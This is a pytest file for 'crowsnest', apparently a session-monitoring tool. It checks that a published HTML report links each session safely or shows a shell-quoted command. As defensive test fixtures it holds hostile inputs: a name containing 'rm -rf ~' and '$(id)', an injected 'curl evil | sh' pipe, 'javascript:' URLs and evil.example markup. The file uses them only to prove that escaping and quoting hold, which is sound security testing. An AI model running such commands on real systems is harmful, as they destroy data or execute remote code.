"""Every session the report names leads to it (crowsnest issue #49).

Three places on the page name a session: a register row, a quiet row, and the list under
the spawn tree. Each one links to the session on claude.ai when it has a ``session_url``,
and otherwise shows the ``crowsnest open`` command that reaches it from a terminal. Two
promises are kept alongside: the SVG itself still carries no link, and a *name* can never
make itself one -- only the registry's URL becomes an ``href``.
"""

from __future__ import annotations

import html as _html
import re
import shlex
from pathlib import Path

from fixtures import (
    ALIVE,
    demo_home,
    finished_session,
    registry_record,
    write_registry,
    write_transcript,
)

from crowsnest import registry, tools
from crowsnest.__main__ import main
from crowsnest.lineage import from_records, graph, lineage_path, open_command, spawn_event
from crowsnest.report import render_report
from crowsnest.tree import MAX_INDENT_DEPTH

STAMP = "2026-02-01T12:00:00Z"
URL = "https://claude.ai/code/session_01LINKED"


def _row(label="fixer", **extra):
    return {
        "label": label,
        "project": "demo",
        "status": "busy",
        "status_since": 0,
        "activity": {},
        **extra,
    }


def _page(*rows, lineage=None):
    roster = {"sessions": list(rows), "counts": {}}
    if lineage is not None:
        roster["lineage"] = lineage
    return render_report(roster, made_at=STAMP)


def _node(name, *, children=(), status="idle", alive=True, depth=0, **extra):
    return {
        "name": name,
        "label": name,
        "status": status,
        "alive": alive,
        "depth": depth,
        "children": list(children),
        "parent": "",
        "confidence": "",
        "project": "",
        "home": "",
        "session_url": "",
        **extra,
    }


def _forest(nodes, roots):
    return {
        "nodes": nodes,
        "roots": roots,
        "edges": [{"parent": "p", "child": "c"}],
        "orphans": [],
        "counts": {"edges": 1, "roots": len(roots)},
    }


def _tree_list(page: str) -> str:
    return re.search(
        r'<details class="spawn-tree-list">.*?</details>', page, re.DOTALL
    ).group(0)


def _items(fragment: str) -> list[str]:
    return re.findall(r"<li[^>]*>(.*?)</li>", fragment, re.DOTALL)


def _commands(fragment: str) -> list[str]:
    return [
        _html.unescape(c)
        for c in re.findall(r"<code[^>]*>(crowsnest open[^<]*)</code>", fragment)
    ]


def _pasted(monkeypatch, capsys, command: str) -> str:
    """Paste ``command`` through the real CLI parser; the id of the session it reaches."""
    got = {}

    def fake_open(session, **kw):
        found = tools.resolve(session, **kw)
        got["sid"] = found.session_id
        return {"name": found.label, "how": "resolved", "detail": found.session_id}

    monkeypatch.setattr("crowsnest.__main__._open_session", fake_open)
    argv = shlex.split(command)
    assert argv[:2] == ["crowsnest", "open"]
    main(argv[1:])
    capsys.readouterr()
    return got.get("sid", "")


# --------------------------------------------------------------------------------------
# The command


def test_the_command_is_quoted_so_a_name_cannot_run_in_the_shell_it_is_pasted_into():
    name = "fix; rm -rf ~ \"$(id)\" 'x'"
    assert shlex.split(open_command({"label": name})) == ["crowsnest", "open", name]


def test_the_command_for_a_session_on_a_named_home_reads_its_address():
    """`resolve` only splits `name@home` under `--all-homes`; without the flag the address
    is looked up as a session named `fixer@two`, and is not found."""
    assert shlex.split(open_command({"label": "fixer", "home": "two"})) == [
        "crowsnest",
        "open",
        "--all-homes",
        "fixer@two",
    ]


def test_a_row_with_no_name_has_no_command():
    assert open_command({}) == ""


def test_a_home_under_the_users_own_directory_is_written_with_a_tilde(
    tmp_path, monkeypatch
):
    """The page is published, so the command names the account's directory without the
    user's name. `--home` expands the `~` itself, so the quotes around it cost nothing."""
    monkeypatch.setattr(Path, "home", lambda: tmp_path)
    command = open_command({"label": "cn"}, home_dir=tmp_path / ".claude-iq")
    assert command == "crowsnest open --home '~/.claude-iq' cn"
    page = _page(_row(label="cn", session_url="", open_command=command))
    assert _commands(page) == [command] and str(tmp_path) not in page


def test_a_session_with_an_id_is_addressed_by_it_not_by_its_name():
    """A name can belong to two sessions, match a session named after an id head, or hold
    an `@` that reads as a home. An id does none of that, and needs no `@home` either."""
    row = {"label": "job@root", "session_id": "a1b2c3d4-0000-0000"}
    assert open_command(row) == "crowsnest open a1b2c3d4-0000-0000"
    assert open_command({**row, "home": "tw"}) == (
        "crowsnest open --all-homes a1b2c3d4-0000-0000"
    )


def test_a_row_whose_open_command_is_not_one_gets_one_made_from_the_row():
    page = _page(_row(session_url="", open_command="crowsnest open x; curl evil | sh"))
    assert _commands(page) == ["crowsnest open fixer"] and "curl" not in page


def test_a_command_the_page_may_not_publish_is_withheld_and_says_so():
    page = _page(
        _row(session_url="", open_command="crowsnest open --home /home/deploy/c x")
    )
    assert "/home/deploy" not in page and _commands(page) == []
    assert "terminal command withheld" in page


# --------------------------------------------------------------------------------------
# The rows


def test_a_row_without_a_url_shows_the_command_that_reaches_it():
    page = _page(_row(session_url=""))
    assert '<code class="way-in">crowsnest open fixer</code>' in page
    assert ">open</a>" not in page


def test_a_row_with_a_url_is_unchanged():
    page = _page(_row(session_url=URL))
    assert (
        f'<p class="where">demo <span class="sep">·</span> <a href="{URL}">open</a></p>'
        in page
    )
    assert "crowsnest open" not in page


def test_a_quiet_row_without_a_url_shows_the_command_too():
    page = _page(_row(label="old", status="idle", session_url=""))
    quiet = page.split('id="quiet"', 1)[1]
    assert '<code class="way-in">crowsnest open old</code>' in quiet


def test_a_row_on_another_home_gets_the_command_for_its_address():
    page = _page(_row(home="two", session_url=""))
    assert _commands(page) == ["crowsnest open --all-homes fixer@two"]


def test_a_url_the_page_refuses_falls_back_to_the_command():
    page = _page(_row(session_url="javascript:alert(1)"))
    assert "javascript:" not in page
    assert _commands(page) == ["crowsnest open fixer"]


def test_a_hostile_name_reaches_the_page_as_the_exact_command_and_no_markup():
    name = '<b>x</b>; echo "$(id)"'
    page = _page(_row(label=name, session_url=""))
    assert "<b>x</b>" not in page
    (command,) = _commands(page)
    assert shlex.split(command) == ["crowsnest", "open", name]


# --------------------------------------------------------------------------------------
# The tree's list


def test_every_session_in_the_tree_is_a_link_to_it_or_shows_the_command():
    lin = _forest(
        [
            _node("boss", children=["kid-linked", "kid-plain"], session_url=URL),
            _node("kid-linked", depth=1, session_url=URL + "2"),
            _node("kid-plain", depth=1),
        ],
        ["boss"],
    )
    listed = _tree_list(_page(_row(), lineage=lin))
    assert f'<a href="{URL}">boss</a>' in listed
    assert f'<a href="{URL}2">kid-linked</a>' in listed
    assert (
        'kid-plain <span class="sep">·</span> <code class="way-in">crowsnest open kid-plain</code>'
        in listed
    )


def test_a_session_that_exited_is_named_but_given_no_command_that_cannot_work():
    lin = _forest(
        [
            _node("boss", alive=False, status="gone", children=["kid"]),
            _node("kid", depth=1),
        ],
        ["boss"],
    )
    listed = _tree_list(_page(_row(), lineage=lin))
    assert _commands(listed) == ["crowsnest open kid"]
    assert "boss" in listed and "<a " not in listed


def test_a_collapsed_fleet_is_not_a_session_and_leads_nowhere():
    kids = [f"k{n}" for n in range(12)]
    lin = _forest(
        [_node("boss", children=kids, session_url=URL)]
        + [_node(k, depth=1, session_url=f"{URL}{k}") for k in kids],
        ["boss"],
    )
    listed = _tree_list(_page(_row(), lineage=lin))
    (fleet,) = [item for item in _items(listed) if " more " in item]
    assert "<a " not in fleet and "<code" not in fleet


def test_a_name_crafted_as_a_url_or_markup_cannot_produce_a_link_in_the_tree():
    """Only a node's `session_url` can become an `href`. A name is text wherever it
    appears, however much it looks like a link -- and a `session_url` the page will not
    follow is no link either."""
    hostile = [
        "https://evil.example/a",
        '<a href="https://evil.example/b">b</a>',
        "[c](https://evil.example/c)",
        "javascript:alert(1)",
        '" href="https://evil.example/d',
    ]
    # Two parents, so that no parent has more than FLEET_MIN children: a collapsed fleet
    # would hide the very rows this test is about.
    nodes = [
        _node("boss", children=hostile),
        _node("other", children=["refused", "real"]),
    ]
    nodes += [_node(name, depth=1) for name in hostile]
    nodes += [
        _node("refused", depth=1, session_url="javascript:alert(2)"),
        _node("real", depth=1, session_url=URL),
    ]
    page = _page(_row(), lineage=_forest(nodes, ["boss", "other"]))
    listed = _tree_list(page)
    drawn = [
        _html.unescape(re.sub(r"<[^>]+>", "", i)).split(" — ")[0] for i in _items(listed)
    ]
    assert "real" in drawn and all(any(d.startswith(h) for d in drawn) for h in hostile)
    assert re.findall(r'href="([^"]*)"', listed) == [URL]
    assert listed.count("<a ") == 1
    assert "evil.example" in listed  # shown, as text
    assert "javascript:alert(2)" not in listed


def test_the_drawing_itself_still_carries_no_link_when_the_list_does():
    lin = _forest(
        [_node("boss", children=["kid"], session_url=URL), _node("kid", depth=1)],
        ["boss"],
    )
    svg = re.search(r"<svg.*?</svg>", _page(_row(), lineage=lin), re.DOTALL).group(0)
    assert "href" not in svg and "crowsnest open" not in svg


def test_the_list_is_reachable_by_a_sighted_reader_not_only_a_screen_reader():
    lin = _forest([_node("boss", children=["kid"]), _node("kid", depth=1)], ["boss"])
    page = _page(_row(), lineage=lin)
    assert "<summary>" in _tree_list(page)
    assert "spawn-tree-alt" not in page and "clip-path" not in page


def test_a_deep_chain_does_not_indent_the_list_off_a_phone():
    n = 30
    nodes = [
        _node(f"d{i}", children=[f"d{i + 1}"] if i < n - 1 else [], depth=i)
        for i in range(n)
    ]
    listed = _tree_list(_page(_row(), lineage=_forest(nodes, ["d0"])))
    indents = [int(m) for m in re.findall(r"margin-left:(\d+)rem", listed)]
    assert max(indents) == MAX_INDENT_DEPTH


# --------------------------------------------------------------------------------------
# Where the links come from: the graph, the roster, show


def _spawned(path, child, sid, parent, parent_sid):
    line = spawn_event(
        child,
        child_session_id=sid,
        parent={"name": parent, "session_id": parent_sid},
        at="2026-01-01T00:00:00+00:00",
    )
    with open(path, "a", encoding="utf-8") as f:
        import json

        f.write(json.dumps(line) + "\n")


def test_the_graph_carries_each_live_nodes_session_url(tmp_path):
    path = tmp_path / "lineage.jsonl"
    _spawned(path, "kid", "sk", "boss", "sb")
    found = graph(
        sessions=[
            {"label": "boss", "session_id": "sb", "session_url": URL},
            {"label": "kid", "session_id": "sk"},
        ],
        sources=[lambda: from_records(lineage_path=path)],
        lineage_path=path,
    )
    urls = {n["name"]: n["session_url"] for n in found["nodes"]}
    assert urls == {"boss": URL, "kid": ""}


def test_the_graph_passes_on_the_command_its_rows_carry_and_none_for_an_exited_parent(
    tmp_path,
):
    """The roster computes the command knowing which home it read; the graph must not lose
    that on the way to the tree."""
    path = tmp_path / "lineage.jsonl"
    _spawned(path, "kid", "sk", "gone", "sg")
    command = "crowsnest open --home /srv/claude kid"
    found = graph(
        sessions=[{"label": "kid", "session_id": "sk", "open_command": command}],
        sources=[lambda: from_records(lineage_path=path)],
        lineage_path=path,
    )
    commands = {n["name"]: n["open_command"] for n in found["nodes"]}
    assert commands == {"kid": command, "gone": ""}


def test_a_live_name_with_an_at_sign_is_not_read_as_a_home(tmp_path):
    """A live node's home is its row's. Reading it back out of the address made a session
    named `me@work` on the one home read into `me` on a home called `work`, and its
    command into one that finds nothing."""
    path = tmp_path / "lineage.jsonl"
    _spawned(path, "me@work", "sk", "boss", "sb")
    found = graph(
        sessions=[
            {"label": "boss", "session_id": "sb"},
            {"label": "me@work", "session_id": "sk"},
        ],
        sources=[lambda: from_records(lineage_path=path)],
        lineage_path=path,
    )
    node = next(n for n in found["nodes"] if n["session_id"] == "sk")
    assert node["home"] == ""
    assert open_command(node) == "crowsnest open sk"


def _live(monkeypatch, alive):
    monkeypatch.setattr(registry, "pid_alive", lambda pid: pid in alive)
    monkeypatch.setattr(
        tools,
        "live_sessions",
        lambda **kw: registry.live_sessions(
            **{"is_alive": lambda pid: pid in alive, **kw}
        ),
    )


def test_roster_and_show_carry_a_command_that_reaches_the_session(
    tmp_path, monkeypatch, capsys
):
    """A roster read from one home names that home's directory, so the command reaches the
    session from a terminal on any account."""
    home = demo_home(tmp_path)
    _live(monkeypatch, ALIVE)
    rows = tools.roster(home=home, activity=False)["sessions"]
    shown = tools.show("fixer", home=home, links=False)["session"]
    assert all("session_url" in r for r in [*rows, shown])
    fixer = next(r for r in rows if r["label"] == "fixer")
    assert shown["open_command"] == fixer["open_command"]
    for row in rows:
        assert "--home" in shlex.split(row["open_command"])
        assert _pasted(monkeypatch, capsys, row["open_command"]) == row["session_id"]


# --------------------------------------------------------------------------------------
# The acceptance run: `crowsnest report --all-homes` on a fleet with a spawn tree


def test_report_all_homes_leads_to_every_live_session_it_names(
    tmp_path, monkeypatch, capsys
):
    """Two homes, a parent on one and four children on the other -- one with Remote
    Control, three without, two of those named to break a careless command -- plus a
    session whose parent has exited. Every session the page names is a link or a command,
    and every command it prints, pasted, reaches exactly that session."""
    home_a = demo_home(tmp_path / "a")  # fixer s1, parser s2, shipper s3
    home_b = tmp_path / "b" / "claude"
    kids = {"linked": 201, "plain": 202, "-dash": 203, "odd; name": 204}
    for name, pid in kids.items():
        sid = f"s{pid}"
        write_transcript(home_b, "/w/demo", sid, finished_session(sid))
        rec = registry_record(pid, sid, name=name)
        if name == "linked":
            rec["bridgeSessionId"] = "session_01LINKED"
        write_registry(home_b, rec)
    cfg = tmp_path / "config.toml"
    cfg.write_text(
        f"[[homes]]\nname = \"one\"\npath = '{home_a}'\n\n"
        f"[[homes]]\nname = \"two\"\npath = '{home_b}'\n"
    )
    monkeypatch.setenv("CROWSNEST_CONFIG", str(cfg))
    _live(monkeypatch, ALIVE | set(kids.values()))
    records = lineage_path()
    records.parent.mkdir(parents=True, exist_ok=True)
    for name, pid in kids.items():
        _spawned(records, name, f"s{pid}", "fixer", "s1")
    _spawned(records, "parser", "s2", "gone-boss", "sid-gone")

    main(["report", "--all-homes"])
    page = capsys.readouterr().out
    listed = _tree_list(page)

    assert re.findall(r'href="([^"]*)"', listed) == [URL]
    for item in _items(listed):
        text = _html.unescape(re.sub(r"<[^>]+>", "", item))
        if text.startswith("gone-boss"):
            assert "<a " not in item and "<code" not in item
        else:
            assert ("<a " in item) != ("<code" in item), text

    # A row with no URL shows the command; the row with one keeps its "open" link.
    assert f'<a href="{URL}">open</a>' in page
    assert "crowsnest open --all-homes s202" in _commands(page)

    resolved = {}

    def fake_open(session, **kw):
        found = tools.resolve(session, **kw)
        resolved[found.session_id] = found.label
        return {"name": found.label, "how": "resolved", "detail": found.session_id}

    monkeypatch.setattr("crowsnest.__main__._open_session", fake_open)
    commands = sorted(set(_commands(page)))
    for command in commands:
        argv = shlex.split(command)
        assert argv[:2] == ["crowsnest", "open"]
        main(argv[1:])
    capsys.readouterr()
    assert resolved == {
        "s1": "fixer",
        "s2": "parser",
        "s3": "shipper",
        "s202": "plain",
        "s203": "-dash",
        "s204": "odd; name",
    }
